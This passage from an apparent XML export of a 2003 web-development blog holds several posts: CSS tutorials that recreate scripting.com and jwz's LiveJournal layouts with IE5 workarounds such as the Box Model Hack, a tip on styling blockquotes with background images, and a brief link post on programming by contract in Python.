&lt;p&gt;And &lt;a href=&quot;/code/css/scripting/header2.html&quot; title=&quot;The completed header&quot;&gt;here's the result&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;That's the header finished - now for the paragraphs. The first thing to notice is that they are indented approximately 15 pixels on the left hand side. This can be easily emulated in &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; using either a margin or padding - I'll use padding, but margin would work just fine as well.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;div.entry p {
  padding-left: 15px;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We're nearly finished - all that's left to do now is the permalinks at the end of each paragraph. We will use  &lt;acronym title=&quot;Fahrner Image Replacement&quot;&gt;FIR&lt;/acronym&gt; again, but this time the background image we are using is far smaller than the # sign it is replacing so we can take a slightly different approach:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;div.entry p a.permalink {
  background: #fff url(&quot;sharpPermaLink.gif&quot;) no-repeat center center;
  text-decoration: none;
}
div.entry p a.permalink span {
  visibility: hidden;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This time the permalink is made invisible using the visiblility property rather than being removed entirely - that way we don't have to worry about adding a width or height to the link. The background image is placed using a shorthand property which allows all of the background properties to be specified at once - it should be relatively clear what the property does.&lt;/p&gt;

&lt;p&gt;The end result &lt;a href=&quot;/code/css/scripting/finished.html&quot; title=&quot;Scripting.com entries with CSS&quot;&gt;can be seen here&lt;/a&gt; - viewed in a standards compliant browser (I tried it in Firebird, IE 5 and Opera 7) I think you'll agree it's an almost exact replica of the original, but with a great deal less markup. Times that saving by several dozen entries on a page and it really starts to add up.&lt;/p&gt;

&lt;p&gt;Final note: this entry comes with apologies to Dave Winer of scripting.com, who has not been consulted prior to the publication of the article.&lt;/p&gt; </field>
		<field name="created">2003-05-19 23:58:23</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">979</field>
		<field name="title">Defeating IE5 CSS bugs with the help of jwz</field>
		<field name="slug">defeatingIE5</field>
		<field name="body">&lt;p&gt;Today's &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; case study will be &lt;a href=&quot;http://www.livejournal.com/~jwz/&quot;&gt;Jamie Zawinski's LiveJournal&lt;/a&gt;. OK, I admit that he's something of a tempting target after his widely publicised &lt;a href=&quot;http://www.livejournal.com/~jwz/193866.html&quot;&gt;CSS rant&lt;/a&gt; last month (which was the main inspiration for this course), but there are a number of sensible reasons his site makes a good case study as well. The theme for today is &quot;bugs in IE5 for Windows&quot;, and jwz's site offers two classic examples that fit this theme nicely. The first is the fact that the design is centered on the page, and the second is his choice of Verdana, a font which requires some trickery to get working well in IE5. In addition, the design of the entries seems to be a natural fit for a table based layout, so demonstrating how much simpler the code can be in &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; will hopefully turn a few heads.&lt;/p&gt;

&lt;p&gt;Here's the &quot;before&quot; screenshot:&lt;/p&gt;

&lt;p class=&quot;img&quot;&gt;&lt;img alt=&quot;Life isn&amp;apos;t fun 24 hours a day...&quot; height=&quot;333&quot; longdesc=&quot;http://www.livejournal.com/~jwz/203141.html&quot; src=&quot;http://simon.incutio.com/code/css/jwz/jwz.gif&quot; width=&quot;615&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And here's the original HTML (I've added some newlines but other than that it's as seen on the page):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;html&quot;&gt;
&amp;lt;table summary=&quot;&quot; border=&quot;0&quot; cellpadding=&quot;2&quot; class=&quot;entrybox&quot; width=&quot;600&quot; 
cellspacing=&quot;0&quot;&amp;gt;
&amp;lt;tr align=&quot;left&quot;&amp;gt;
&amp;lt;td align=&quot;center&quot; bgcolor=&quot;#00CC00&quot;&amp;gt;
&amp;lt;table summary=&quot;&quot; border=&quot;0&quot; cellpadding=&quot;5&quot; width=&quot;100%&quot; cellspacing=&quot;0&quot;&amp;gt;

&amp;lt;tr align=&quot;left&quot;&amp;gt;
&amp;lt;td class=&quot;caption&quot;&amp;gt;Life isn't fun 24 hours a day, so shopping should be.&amp;lt;/td&amp;gt;
&amp;lt;td class=&quot;index&quot; align=&quot;right&quot;&amp;gt;[18&amp;amp;nbsp;May&amp;amp;nbsp;2003|&amp;lt;b&amp;gt;04:09pm&amp;lt;/b&amp;gt;]&amp;lt;/td&amp;gt;
&amp;lt;/tr&amp;gt;
&amp;lt;tr align=&quot;left&quot;&amp;gt;
&amp;lt;td bgcolor=&quot;#000000&quot; colspan=&quot;2&quot;&amp;gt;

&amp;lt;table summary=&quot;&quot; border=&quot;0&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot;&amp;gt;
&amp;lt;tr&amp;gt;
&amp;lt;td class=&quot;meta&quot;&amp;gt;[&amp;lt;/td&amp;gt;

&amp;lt;td class=&quot;meta&quot; align=&quot;right&quot;&amp;gt;&amp;lt;b&amp;gt;music&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;
&amp;lt;td class=&quot;meta&quot; align=&quot;center&quot;&amp;gt;|&amp;lt;/td&amp;gt;
&amp;lt;td class=&quot;meta&quot;&amp;gt;Luscious Jackson -- Bam Bam&amp;lt;/td&amp;gt;
&amp;lt;td class=&quot;meta&quot;&amp;gt;]&amp;lt;/td&amp;gt;
&amp;lt;/tr&amp;gt;

&amp;lt;/table&amp;gt;&amp;lt;p&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;a href=&quot;
http://www.nytimes.com/2003/05/18/magazine/18TOKYO.html?8hpib=&amp;amp;amp;pagewanted=all&quot;&amp;gt;
The Economy of Cool&amp;lt;/a&amp;gt; &amp;lt;p&amp;gt; Katayama has a dozen or so interiors to his credit in 
Harajuku-Aoyama, Tokyo's fashion and design district. All within walking distance 
of one another, they are boutiques that, in almost every case, aggressively cater 
to a youthful clientele for whom shopping is an adored cultural pursuit. ''You're 
not just buying the product,'' Katayama says. ''You're also buying the time you 
spend.'' [...] &amp;lt;p&amp;gt; Now 36, Masamichi Katayama studied interior design in Osaka, 
although he is quick to point out that it was strictly technical training, with 
no theoretical or academic courses. ''I learned the philosophy of what I do by 
shopping,'' he says. ''I'm a consumer first and foremost. Life isn't fun 24 hours 
a day, so shopping should be.'' He lights cigarette after cigarette as he speaks, 
taking no more than three drags on each before moving on to the next. [...] &amp;lt;p&amp;gt;

&amp;lt;/td&amp;gt;
&amp;lt;/tr&amp;gt;
&amp;lt;tr&amp;gt;
&amp;lt;td class=&quot;comments&quot; width=&quot;100%&quot; align=&quot;right&quot; bgcolor=&quot;#004400&quot; colspan=&quot;2&quot;&amp;gt;
&amp;lt;a href=&quot;http://www.livejournal.com/~jwz/203141.html&quot;&amp;gt;&amp;lt;b&amp;gt;2 comments&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;|
&amp;lt;a href=&quot;http://www.livejournal.com/~jwz/203141.html?mode=reply&quot;&amp;gt;post comment&amp;lt;/a&amp;gt;
&amp;lt;/td&amp;gt;
&amp;lt;/tr&amp;gt;
&amp;lt;/table&amp;gt;
&amp;lt;/td&amp;gt;
&amp;lt;/tr&amp;gt;
&amp;lt;/table&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That's three tables for every entry on the page. If we trim it down to basic structural HTML, we get the following:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;html&quot;&gt;&amp;lt;div class=&quot;entry&quot;&amp;gt;
&amp;lt;p class=&quot;date&quot;&amp;gt;[18 May 2003|&amp;lt;strong&amp;gt;04:09pm&amp;lt;/strong&amp;gt;]&amp;lt;/p&amp;gt;
&amp;lt;h2&amp;gt;Life isn't fun 24 hours a day, so shopping should be.&amp;lt;/h2&amp;gt;
&amp;lt;p class=&quot;music&quot;&amp;gt;[&amp;lt;strong&amp;gt;music&amp;lt;/strong&amp;gt;|Luscious Jackson -- Bam Bam]
&amp;lt;p&amp;gt;&amp;lt;a href=&quot;
http://www.nytimes.com/2003/05/18/magazine/18TOKYO.html?8hpib=&amp;amp;amp;pagewanted=all&quot;&amp;gt;
 The Economy of Cool&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;

&amp;lt;p&amp;gt;Katayama has a dozen or so interiors to his credit in Harajuku-Aoyama,
Tokyo's fashion and design district. All within walking distance of one
another, they are boutiques that, in almost every case, aggressively
cater to a youthful clientele for whom shopping is an adored cultural
pursuit. ''You're not just buying the product,'' Katayama says.
''You're also buying the time you spend.'' [...] &amp;lt;/p&amp;gt;

&amp;lt;p&amp;gt;Now 36, Masamichi Katayama studied interior design in Osaka, although he is
quick to point out that it was strictly technical training, with no
theoretical or academic courses. ''I learned the philosophy of what I
do by shopping,'' he says. ''I'm a consumer first and foremost. Life
isn't fun 24 hours a day, so shopping should be.'' He lights cigarette
after cigarette as he speaks, taking no more than three drags on each
before moving on to the next. [...] &amp;lt;/p&amp;gt;

&amp;lt;p class=&quot;comments&quot;&amp;gt;
&amp;lt;a href=&quot;http://www.livejournal.com/%7Ejwz/203141.html&quot; class=&quot;count&quot;&amp;gt;2 comments&amp;lt;/a&amp;gt;
|&amp;lt;a href=&quot;http://www.livejournal.com/%7Ejwz/203141.html?mode=reply&quot;&amp;gt;post comment&amp;lt;/a&amp;gt;
&amp;lt;/p&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That's quite a substantial reduction in markup. Here's &lt;a href=&quot;/code/css/jwz/jwz-unstyled.html&quot; title=&quot;jwz restructured and unstyled&quot;&gt;what it looks like&lt;/a&gt;. The challenge now is to make it look like it does in the picture.&lt;/p&gt;

&lt;p&gt;First, let's set a few basic rules. JWZ's site has green text on a black background, both of which should be set as rules on the document body (they could be set on individual elements but since they apply to the whole document it's best to define them higher up):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;body {
  background-color: #000;
  color: #0f0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Note that while the original site uses #000000 and #00FF00 as hexadecimal colour attributes on the body tag, I have used #000 and 
#0f0. Since many common colours can be represented using three pairs of hexadecimal digits, &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; allows you to use three instead of six and will &quot;double&quot; each digit in its place. &lt;code&gt;color: #00ff00;&lt;/code&gt; would have exactly the same effect.&lt;/p&gt;

&lt;h4&gt;Setting the font size (IE bug #1)&lt;/h4&gt;

&lt;p&gt;Now it's time to tackle our first IE5/Windows specific bug. Verdana is an extremely popular font among web designers, but suffers from the unfortunate problem that it is sinfully ugly when displayed at the browser's default text size. Knock it down just one size and it becomes a great deal pretty, while remaining completely readable. As a result, if we want to use Verdana we really need to make it smaller.&lt;/p&gt;

&lt;p&gt;&lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; provides a truly huge range of font sizing options, and each and every one of them carries its own set of flaws and limitations thanks to differences in implementation between the many &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; supporting browsers. A good resource for understanding the scope of this problem is Owen Brigg's excellent &lt;a href=&quot;http://www.thenoodleincident.com/tutorials/box_lesson/font/&quot;&gt;Text Sizing article&lt;/a&gt;, which includes 274 screenshots of different font sizing techniques in different environments. To cut a long story short, the only reliable cross browser sizing method is to specify the size of the font in pixels. This comes with one massive drawback: doing so will prevent IE users from resizing the text in their browsers. If you care at all about accessibility you'll know why this is a bad idea.&lt;/p&gt;

&lt;p&gt;No matter which font sizing technique you use, it is widely recognised that the best way of dealing with font sizes is to set a single basic font size on the body and then size other text on the page relative to that initial size using ems (described briefly last tutorial) or percentages. Personally, I like to use a font such as Georgia which looks good at the default browser size setting and avoid the whole issue of setting an initial size, but as we have already discussed if you are using Verdana this is pretty much out of the question. When forced to resize the default font, my favoured method is to use the font-size keywords &lt;code class=&quot;css&quot;&gt;small&lt;/code&gt; and &lt;code class=&quot;css&quot;&gt;x-small&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This is where the IE5 bug comes in. Most browsers (including IE6 in standards mode, all Gecko engine browsers and Opera 7) display Verdana at the size I prefer if you specify &lt;code&gt;font-size: small&lt;/code&gt;. IE5 for Windows on the other hand requires &lt;code&gt;font-size: x-small&lt;/code&gt;. Since IE5 still has a relatively large market share, it's important to get things looking good in that browser, no matter how irritating it's support of &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;. It's time to apply a &lt;dfn&gt;hack&lt;/dfn&gt;...&lt;/p&gt;

&lt;p&gt;Hacks are something of a controversial issue within the &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; community. Some people see them as an anathema to everything that &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; is meant to represent, while others (myself included) see them as a slightly unpleasant tool that can help achieve a practical end. Since the focus of this tutorial is on the practical applications of &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;, I'll leave discussions of the validity of hacks to the &lt;a href=&quot;http://css-discuss.incutio.com/?page=ToHackOrNotToHack&quot; title=&quot;To hack or not to hack&quot;&gt;css-discuss wiki&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The hack I shall be using here is the famous &lt;a href=&quot;http://www.tantek.com/CSS/Examples/boxmodelhack.html&quot;&gt;Box Model Hack&lt;/a&gt; by Tantek Celik. Originally devised to get around a serious flaw in IE's implementation of the box model (to be covered later in the course), the box model hack allows a &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; author to feed one value to IE5 and another to better, more standards compliant browsers. We want to give IE5 &lt;code&gt;x-small&lt;/code&gt; and everything else &lt;code&gt;small&lt;/code&gt;, and here's the code we are going to use:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;body {
  background-color: #000;
  color: #0f0;
  font-family: verdana, sans-serif;
  font-size: x-small;
  voice-family: &quot;\&quot;}\&quot;&quot;;
  voice-family: inherit;
  font-size: small;
}
html&amp;gt;body {
  font-size: small;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ugly, isn't it? The way it works is explained &lt;a href=&quot;&quot;&gt;elsewhere&lt;/a&gt;, but believe it or not the above code will kick IE5 in to line with the rest of the mainstream browsing world. Here's &lt;a href=&quot;/code/css/jwz/jwz-text.html&quot; title=&quot;jwz, text styled&quot;&gt;how it looks&lt;/a&gt;. Let's move on.&lt;/p&gt;

&lt;h4&gt;Styling the Entry&lt;/h4&gt;

&lt;p&gt;Now that text sizing is out of the way, we can get on with styling the entry itself. First, let's look at the div surrounding each entry. Firstly, it needs to be 600 pixels wide to match the width of the table in the original. The original design has a 2 pixel wide line around the edge of the table, and we can replicate this using a &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; border. Borders in &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; can be applied to the top, left, right and/or bottom of an element in any colour, any thickness and a number of different styles: they are a very powerful tool. In this case we just need a 2 pixel wide green border around the whole div. Here's the &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;div.entry {
  width: 600px;
  border: 2px solid #0c0; /* Applied all the way around the div */
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The entry title is a critical part of the design. We have used an h2, but we need to style this with a green background and correctly sized black text. Headers always come with a default margin above and below the header, but since we are using the background colour of the element as part of the design we need to eliminate this by specifically setting the margins around the element to 0. We also need some padding to give the text inside the element some space - trial and error leads us to set this at 5 pixels:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;h2 {
  margin: 0;
  padding: 5px;
  font-size: 1em;
  color: #000;
  background-color: #0c0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The date for each entry appears alongside the title, on the right hand side. As we saw last time, this can be achieved with a float. I'll also set the font size to 0.85em (again found using trial and error) and add some padding to ensure the date appears inline with the heading:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;div.entry p.date {
  font-size: 0.85em;
  float: right;
  color: #000;
  background-color: #0c0
  margin: 0;
  padding-top: 5px;
  padding-right: 5px;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I've specified the background-color again because it is good practise to always set a background colour at the same time as you set the colour of an element. This helps ensure you never accidentally end up with unreadable text that is the same colour as its background.&lt;/p&gt;

&lt;p&gt;Here's what our redesign &lt;a href=&quot;/code/css/jwz/jwz-header.html&quot;&gt;looks like now&lt;/a&gt;.&lt;/p&gt;

&lt;h4&gt;Tidying up the text&lt;/h4&gt;

&lt;p&gt;There are two glaring problems with what we now have. Firstly, there is no space between the borders and the text. Secondly, the link colours aren't as they should be. We can lift the link colours straight from the attributefs on the body tag in the original site:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;a:link {
  color: #00DDFF;
  text-decoration: none;
}
a:visited {
  color: #FF6633;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We are using &lt;code&gt;a:link&lt;/code&gt; as the selector rather than just &lt;code&gt;a&lt;/code&gt; on its own, because &lt;code&gt;a&lt;/code&gt; will match all &lt;code class=&quot;html&quot;&gt;&amp;lt;a&amp;gt;&lt;/code&gt; elements including those that are just being used as a link target. There aren't any on the page, but it's a good idea to get in to the practise of using &lt;code&gt;a:link&lt;/code&gt; to style links anyway. &lt;code&gt;a:visited&lt;/code&gt; applies styles to visited links. The &lt;code&gt;:something&lt;/code&gt; syntax is called a &lt;dfn&gt;pseudo-selector&lt;/dfn&gt;. It's also worth noting an accessibility point here: it's generally a very bad idea to set links apart from normal text by colour alone, so &lt;code&gt;text-decoration: none&lt;/code&gt; should be discouraged unless some other non-colour based visual indicator is also specified. I'm ignoring that for this example in order to comply with the original design.&lt;/p&gt;

&lt;p&gt;Space between the border and the text can be added in a number of ways: as padding within the entry, as a margin on the paragraphs or as padding on the paragraphs. Since we have set a width on the entry it's a good idea to avoid adding padding to this as this can result in IE5 misbehaving (a box model problem, which could be solved by the box model hack but why hack when you can possibly avoid it?). Instead we will set a margin on the paragraphs:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;div.entry p {
  margin: 1em 5px;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here we are using another &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; shorthand. Both padding and margin properties can be set with one, two, three or four properties. If only one is provided, it is applied to all four sides. If two are provided (as in this example) the first is applied to top and bottom and the second to left and right. If four are provided, they apply to Top, Right, Bottom, Left respectively (a good mnemonic for this is &lt;strong&gt;TR&lt;/strong&gt;ou&lt;strong&gt;BL&lt;/strong&gt;e, which I picked up from Eric Meyer). Behaviour for three properties is defined but it's quite complicated so I recommend avoiding it entirely. The upshot of all this is that the above rule adds a 1em margin to the top and bottom of each paragraph and 5 pixels to either side. You'd be forgiven for thinking that this means margins would be spaced 2 ems apart, but in fact the margins on elements on top of each other &lt;dfn&gt;collapse&lt;/dfn&gt; to fill the space of just one. I'll talk about this more when I cover the box model in detail.&lt;/p&gt;

&lt;p&gt;The styles for the comments section at the bottom (complete with dark green background) and the music section at the top of the entry should be pretty self explanatory, so I'll provide them here without further analysis:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;div.entry p.comments {
  background-color: #040;
  margin: 0;
  padding: 5px;
  text-align: right;
  font-size: 0.85em;
}
p.comments a.count {
  font-weight: bold;
}
div.entry p.music {
  font-size: 0.85em;
  margin-top: 0.5em;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Note that both paragraphs have a margin explicitly set - this is important as we need to over-ride the margin set on all paragraphs within div.entry earlier on. This is also related to the reason the full &lt;code class=&quot;selector&quot;&gt;div.entry p.comments&lt;/code&gt; selector is used instead of just &lt;code&gt;p.comments&lt;/code&gt; - if you want to know the full reason for this, look up the &lt;a href=&quot;http://www.w3.org/TR/REC-CSS2/cascade.html#specificity&quot;&gt;CSS specificity rules&lt;/a&gt; which are outside the scope of this article.&lt;/p&gt;

&lt;h4&gt;Centering the DIV&lt;/h4&gt;

&lt;p&gt;&lt;a href=&quot;/code/css/jwz/jwz-uncentered.html&quot; title=&quot;jwz in CSS, styled but uncentered&quot;&gt;We're nearly there&lt;/a&gt;! All that remains is to center the div on the page. This is the point where our second IE5/Windows bug rears it's ugly head...&lt;/p&gt;

&lt;p&gt;The standard way of centering a block level element (for example a div or a paragraph) in &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; is to set the left and right margins of the paragraph to &quot;auto&quot;. This can be achieved using the shorthand property explained above: &lt;code&gt;margin: 0 auto;&lt;/code&gt;. Were it not for IE5, our troubles would be over. Unfortunately, IE5 fails to recognise this method.&lt;/p&gt;

&lt;p&gt;As luck would have it, we can now use another IE5 bug to our advantage. The &lt;code&gt;text-align: center&lt;/code&gt; declaration, as you might expect, aligns text in the center of the element. IE5 incorrectly also applies the property to block level elements, which include our troublesome div. So we can set &lt;code&gt;text-align: center&lt;/code&gt; on our body element and all is well...?&lt;/p&gt;

&lt;p&gt;Not quite. Like most text properties (such as the font-size property we were playing with earlier) &lt;code&gt;text-align&lt;/code&gt; is inherited. If we center the text in our body, we end up centering it in all of our other elements as well. Luckily we can use &lt;code&gt;text-align: left&lt;/code&gt; on the other elements in our document to prevent this from happening. Combine these three &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; tricks and you get the following method for centering elements in an IE5 friendly way:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;body {
  ...
  text-align: center;
}
div.entry {
  ...
  margin: 0 auto;
}
body div, body p, body h2 {
  text-align: left;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Which brings us to our final result: &lt;a href=&quot;http://simon.incutio.com/code/css/jwz/jwz.html&quot;&gt;JWZ's blog entries in pure CSS&lt;/a&gt;. It took quite a bit of work, but I think the results speak for themselves.&lt;/p&gt;

&lt;h4&gt;What you should have learned&lt;/h4&gt;

&lt;p&gt;While most designs can be achieved in &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;, some are harder than others. This is not the fault of &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;; it is more a problem with faulty browser implementations of &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;. When people call IE5/Windows the &quot;new Netscape 4&quot;, they are doing so with good reason! However, IE5's deficiencies are well understood with the &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; community and workarounds exist which, while initially tricky, for the most part work very well. With a bit of insider knowledge the beast can be tamed.&lt;/p&gt;

&lt;p&gt;In this tutorial I've tried to roll up my sleeves and get stuck in to the dirtier side of &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; development. I've demonstrated some hacks, and I've shown how there can be more to practical &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; than meets the eye. It may seem like an awful lot of work, but in fact the initial jwz remake took me just over half an hour thanks to my previous experience with IE5 bugs.&lt;/p&gt;

&lt;p&gt;For the next installment, I will be stepping back from hacks and unpleasantries and looking at &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; being used in a much simpler light: to visually enhance semantically structured page elements. I also have another case study planned which will make much lighter reading than this one. As always, comments are welcome.&lt;/p&gt;

&lt;p&gt;And finally, apologies to jwz for borrowing without asking. I hope I haven't caused offence.&lt;/p&gt;</field>
		<field name="created">2003-05-20 23:58:01</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">980</field>
		<field name="title">Quick tip: Styling blockquotes with CSS</field>
		<field name="slug">stylingBlockquotes</field>
		<field name="body">&lt;p&gt;Today's tutorial is going to be short one, as I'm working on one last piece of coursework. This time I'm going to explain a clever &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; trick borrowed from &lt;a href=&quot;http://www.frejol.org/&quot;&gt;Nick Boalch&lt;/a&gt;. Here's a screenshot:&lt;/p&gt;

&lt;p class=&quot;img&quot;&gt;&lt;img alt=&quot;The blockquote has large quote mark images surrounding it&quot; height=&quot;134&quot; src=&quot;http://simon.incutio.com/code/css/boalch/blockquotes.gif&quot; width=&quot;541&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here's the &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;html&quot;&gt;&amp;lt;blockquote cite=&quot;http://www.w3.org/TR/REC-html40/struct/tables.html#h-11.1&quot;&amp;gt;
&amp;lt;div&amp;gt;
Tables should not be used purely as a means to layout document content as 
this may present problems when rendering to non-visual media. 
Additionally, when used with graphics, these tables may force users to 
scroll horizontally to view a table designed on a system with a larger 
display. To minimize these problems, authors should use style sheets to 
control layout rather than tables.
&amp;lt;/div&amp;gt;
&amp;lt;/blockquote&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The &lt;code class=&quot;html&quot;&gt;&amp;lt;div&amp;gt;&lt;/code&gt; in the above code is a slight sticking point: it has no structural value but is required for the technique to work. This is a trade off between 100% structural purity and presentational effects but I think it is one that is worth making.&lt;/p&gt;

&lt;p&gt;Here's the relevant &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;blockquote {
  background: transparent url(quoleft.png) left top no-repeat;
}
blockquote div {
  padding: 0 48px;
  background: transparent url(quoright.png) right bottom no-repeat;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There's a simple trick at work here. &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; backgrounds are extremely powerful but in &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;2 only one background can be applied to any single element. The blockquote effect requires two background images, one for the quote mark on the left hand side and one for the one on the right. The additional nested &lt;code class=&quot;html&quot;&gt;&amp;lt;div&amp;gt;&lt;/code&gt; allows us to do this, by applying one background image to the &lt;code class=&quot;html&quot;&gt;&amp;lt;blockquote&amp;gt;&lt;/code&gt; and one to the &lt;code class=&quot;html&quot;&gt;&amp;lt;div&amp;gt;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The padding is applied to the &lt;code class=&quot;html&quot;&gt;&amp;lt;div&amp;gt;&lt;/code&gt; rather than the &lt;code class=&quot;html&quot;&gt;&amp;lt;blockquote&amp;gt;&lt;/code&gt; because the &lt;code class=&quot;html&quot;&gt;&amp;lt;div&amp;gt;&lt;/code&gt; needs to stretch the entire width of the &lt;code class=&quot;html&quot;&gt;&amp;lt;blockquote&amp;gt;&lt;/code&gt; in order for the background image to appear in the right place. The images are 38 pixels wide, so a padding is applied to the left and right hand sides of the &lt;code class=&quot;html&quot;&gt;&amp;lt;div&amp;gt;&lt;/code&gt; to allow space for the images and give an extra 10 pixels of whitespace.&lt;/p&gt;

&lt;p&gt;You can see the technique being used on &lt;a href=&quot;http://simon.incutio.com/code/css/boalch/blockquote.html&quot; title=&quot;Funky Blockquotes&quot;&gt;this sample page&lt;/a&gt;, or over on &lt;a href=&quot;http://www.frejol.org/&quot;&gt;Nick's weblog&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;One final note: while it's tempting to add &lt;code&gt;font-style: italic&lt;/code&gt; to blockquotes, doing so may cause a &lt;a href=&quot;http://simon.incutio.com/archive/2003/04/09/italicBlockquotesCauseScrollba&quot;&gt;horizontal scrollbar to appear&lt;/a&gt; in &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;6/Windows. Strange but true.&lt;/p&gt;

&lt;p&gt;Incidentally, I've been getting some absolutely fantastic feedback on this series on the comments attached to each entry - please keep it coming! The feedback has included a number of suggested improvements and other worthwhile tips. Rather than editing the original articles I plan to use tomorrow's update to revisit the previous day's articles and update them based on suggestions from the comments.&lt;/p&gt;</field>
		<field name="created">2003-05-21 23:54:22</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">981</field>
		<field name="title">Programming by Contract in Python</field>
		<field name="slug">programmingByContract</field>
		<field name="body">&lt;p&gt;Programming by Contract seems to be a sister technique to unit testing - instead of (or as well as) writing a set of tests for a piece of code you write a set of pre- and post-conditions for the data being processed which are then checked whenever the program is run in debugging mode. &lt;a href=&quot;http://www.wayforward.net/pycontract/&quot;&gt;Contracts for Python&lt;/a&gt; discusses the technique,  providing a reference implementation and a &lt;acronym title=&quot;Python Enhancement Proposals&quot;&gt;PEP&lt;/acronym&gt; suggesting inclusion of support for the technique in the core language.  Programming by contract was first demonstrated in the Eiffel language, and there's a &lt;a href=&quot;http://archive.eiffel.com/doc/manuals/technology/contract/&quot; title=&quot;http://archive.eiffel.com/doc/manuals/technology/contract/&quot;&gt;good introduction to it&lt;/a&gt; in Eiffel.com as well.&lt;/p&gt;
</field>
		<field name="created">2003-05-23 13:57:31</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">982</field>
		<field name="title">Even more buttons</field>
		<field name="slug">evenMoreButtons</field>
